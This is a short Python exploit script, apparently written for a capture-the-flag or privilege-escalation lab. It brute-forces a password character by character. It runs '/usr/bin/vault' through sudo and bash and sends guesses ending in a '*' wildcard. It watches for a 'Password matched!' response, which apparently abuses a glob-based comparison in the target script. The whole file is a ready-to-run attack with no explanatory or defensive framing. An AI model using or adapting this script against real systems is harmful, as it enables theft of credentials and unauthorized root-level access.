import subprocess
import string

COMMAND = ["sudo","/usr/bin/bash", "/usr/bin/vault"]
SUCCESS_PHRASE = "Password matched!"

charset = string.ascii_uppercase + string.ascii_lowercase + string.digits

def test_payload(payload):
    proc = subprocess.Popen(
        COMMAND,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    out, err = proc.communicate(payload + "\n")
    return SUCCESS_PHRASE in out

found = ""

print("[*] Starting character-by-character discovery...\n")

while True:
    char_found = False

    for c in charset:
        payload = found + c + "*"
        # print(f"Trying: {payload}")

        if test_payload(payload):
            found += c
            print(f"[+] Found next char: {c}")
            print(f"[+] Current password: {found}\n")
            char_found = True
            break

    if not char_found:
        print("\n[✔] Password fully discovered!")
        print(f"[✔] Password: {found}")
        break
